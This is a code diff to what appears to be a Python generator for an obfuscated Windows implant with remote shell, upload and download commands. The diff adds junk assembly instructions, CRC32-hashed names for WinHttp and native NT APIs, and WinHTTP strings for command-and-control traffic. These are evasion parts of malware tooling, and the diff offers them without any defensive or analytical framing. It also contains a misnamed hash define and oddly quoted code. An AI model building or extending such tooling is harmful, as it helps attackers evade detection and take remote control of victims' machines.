@@ -46,7 +46,22 @@ instructions = [
     "mov rax, r9",
     "xor rax, rax",
     "cmp rax, rax",
-    "test rax, rax"
+    "test rax, rax",
+    ''"pushfq;" \
+    "push rcx;" \
+    "push rdx;" \
+    "push r8;" \
+    "push r9;" \
+    "xor eax, eax;" \
+    "xor eax, eax;" \
+    "xor ebx, ebx;" \
+    "xor eax, eax;" \
+    "xor eax, eax;" \
+    "pop r9;" \
+    "pop r8;" \
+    "pop rdx;" \
+    "pop rcx;" \
+    "popfq;"''
 ]
 
 plain_function_strings = [
@@ -63,7 +78,15 @@ plain_function_strings = [
     "#define NtAllocateVirtualMemory_CRC32B         \"NtAllocateVirtualMemory\"",
     "#define NtCreateUserProcess_CRC32B             \"NtCreateUserProcess\"",
     "#define NtWriteFile_CRC32B                     \"NtWriteFile\"",
-    "#define NtWriteFile_CRC32B                     \"NtReadFile\""]
+    "#define NtReadFile_CRC32B                      \"NtReadFile\"",
+    "#define WinHttpOpen_CRC32B                     \"WinHttpOpen\"",
+    "#define WinHttpConnect_CRC32B                  \"WinHttpConnect\"",
+    "#define WinHttpOpenRequest_CRC32B              \"WinHttpOpenRequest\"",
+    "#define WinHttpReadData_CRC32B                 \"WinHttpReadData\"",
+    "#define WinHttpReceiveResponse_CRC32B          \"WinHttpReceiveResponse\"",
+    "#define WinHttpSendRequest_CRCB                \"WinHttpSendRequest\"",
+
+]
 
 plain_strings = [
     "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
@@ -73,7 +96,9 @@ plain_strings = [
     "#define S_COMMAND_SHELL          \"command shell\"",
     "#define S_COMMAND_UPLOAD         \"command upload\"",
     "#define S_COMMAND_DOWNLOAD       \"command download\"",
-    "#define S_COMMAND_EXIT           \"command exit\""
+    "#define S_COMMAND_EXIT           \"command exit\"",
+    "#define S_WINHTTP                \"winhttp\"",
+    "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
 ]
 
 
